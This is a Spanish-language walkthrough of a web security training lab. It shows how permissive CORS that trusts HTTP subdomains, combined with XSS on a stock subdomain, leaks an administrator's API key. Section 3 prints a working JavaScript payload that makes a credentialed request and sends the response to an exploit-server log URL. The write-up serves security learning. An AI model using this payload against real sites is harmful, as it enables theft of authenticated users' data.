# 🌐 CORS con protocolos inseguros confiables (Breaking HTTPS)

## 📄 Descripción del laboratorio

El laboratorio implementa una **política CORS demasiado permisiva** que confía en cualquier subdominio del dominio principal sin distinguir el protocolo (**http vs https**).

Además, el servidor incluye la cabecera:

```http
Access-Control-Allow-Credentials: true
```

Esto permite que un **subdominio servido en HTTP (canal inseguro)** realice peticiones autenticadas al endpoint **HTTPS principal** y lea datos sensibles.

El objetivo es:

* Combinar **XSS en un subdominio HTTP** con **CORS permisivo**.
* Robar la **API key del administrador**.
* Resolver el laboratorio.

Credenciales de prueba:

* **wiener : peter**

 

## 📚 Teoría

Muchas aplicaciones validan CORS utilizando reglas del tipo:

```
*.dominio.com
```

El error consiste en asumir que **todos los subdominios utilizan HTTPS**.

Si existe cualquier subdominio que funcione en **HTTP** (por ejemplo, servicios antiguos, microservicios o funcionalidades secundarias), un atacante puede:

1. Inyectar **JavaScript** mediante XSS, open redirect o HTML injection.
2. Ejecutar una **petición CORS** hacia el dominio principal HTTPS.
3. Enviar las **cookies de sesión** utilizando `withCredentials = true`.
4. Leer la **respuesta sensible**, como API keys o datos privados.

### 📌 Impacto

Esto rompe la garantía de confidencialidad de **HTTPS**. Un canal inseguro (**HTTP**) puede acceder a datos protegidos (**HTTPS**) debido a una confianza excesiva en los subdominios.

 

## 📝 Práctica

### 🎯 Objetivo

Extraer la **API key del administrador** explotando **XSS** combinado con **CORS inseguro**.

 

### 1️⃣ Análisis de la política CORS

Se inicia sesión con **wiener:peter** y se analiza la petición:

```http
GET /accountDetails
```

en **Burp Repeater**.

![](../images/c32.png)<br>

Se prueban distintos valores de **Origin**:

* Orígenes arbitrarios → rechazados.
* `Origin: null` → rechazado.
* `Origin: https://lab-id.web-security-academy.net` → aceptado.
* `Origin: http://lab-id.web-security-academy.net` → aceptado.
* `Origin: https://test.lab-id.web-security-academy.net` → aceptado.

![](../images/c33.png)<br>

![](../images/c34.png)<br>

Conclusión:

* Se aceptan **subdominios**.
* Se acepta **HTTP**.
* Se permiten **credenciales**.

 

### 2️⃣ Identificación del subdominio vulnerable

Explorando la aplicación se encuentra la funcionalidad **Check stock**, que carga contenido desde:

```
http://stock.ID-DEL-LAB.web-security-academy.net
```

![](../images/c35.png)<br>

Este subdominio:

* Sirve contenido mediante **HTTP**.
* Es vulnerable a **XSS** a través del parámetro `productId`.

![](../images/c36.png)

### 3️⃣ Construcción del exploit

Se crea un exploit que realiza las siguientes acciones:

1. Redirige a la víctima al **subdominio vulnerable**.
2. Inyecta **JavaScript** mediante **XSS**.
3. Realiza una **petición CORS autenticada** a `/accountDetails`.
4. Envía la respuesta a los **logs del Exploit Server**.

Payload utilizado:

```javascript
<script>
    document.location = "http://stock.ID-DEL-LAB.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = function() { location='https://TU-EXPLOIT-SERVER.exploit-server.net/log?key=' + encodeURIComponent(this.responseText); }; req.open('get','/accountDetails',true); req.withCredentials=true; req.send();<%2fscript>&storeId=1"
</script>
```

En este caso:

* El **XSS se ejecuta en HTTP**.
* El servidor confía en el **subdominio**.
* La petición **CORS autenticada** es aceptada.
* La respuesta sensible se **exfiltra al Exploit Server**.

![](../images/c37.png)
 

### 4️⃣ Ejecución del ataque

Se guarda el exploit pulsando **Store** y posteriormente se selecciona **Deliver exploit to victim**.

 

### 5️⃣ Resultado final

Cuando el administrador carga la página maliciosa:

1. Es redirigido al **subdominio HTTP vulnerable**.
2. Se ejecuta el **JavaScript inyectado**.
3. Se realiza una **petición CORS autenticada** hacia el endpoint HTTPS.
4. La respuesta que contiene la **API key** se envía a los **logs del Exploit Server**.

![](../images/c38.png)<br>

Finalmente se extrae y se decodifica la respuesta obtenida.

De esta forma se obtiene la **API key del administrador**, que se introduce en el laboratorio para resolverlo.

![](../images/c39.png)
